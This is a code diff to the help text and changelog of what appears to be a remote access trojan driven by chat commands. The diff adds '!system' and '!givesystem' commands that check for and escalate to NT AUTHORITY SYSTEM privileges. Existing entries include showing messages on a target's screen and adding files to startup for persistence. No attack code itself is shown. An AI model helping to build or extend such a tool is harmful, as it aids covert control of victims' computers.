@@ -63,10 +63,20 @@ const helpDict = {
   "msg": { "explanation": "Displays a message on the targets screen.", "category": "Utility" },
   "keyhelp": { "explanation": "Sends a help command for the `!key` module.", "category": "Utility" },
   "addstartup": { "explanation": "Adds a given file to startup registry.", "category": "Utility" },
+  "system": { "explanation": "Check if we have System privileges. NT Authority System", "category": "Utility" },
+  "givesystem": { "explanation": "Grants us System Privileges", "category": "Utility" },
 };
 
 /* ======= Changelog (multi-line, English) ======= */
 const changelog = [
+  { v: "v8.2", note: [
+    "Added !system",
+    "Checks if we are running with System Permissions (NT AUTHORITY SYSTEM)",
+    "Added !givesystem",
+    "Grants us NT AUTHORITY SYSTEM Permissions",
+    "if we have Administrator permissions aquired",
+    ].join("\n")
+  },
   { v: "v8.1", note: [
     "Added !addstartup",
     "Allows us to add all kinds of files to the startup registry",
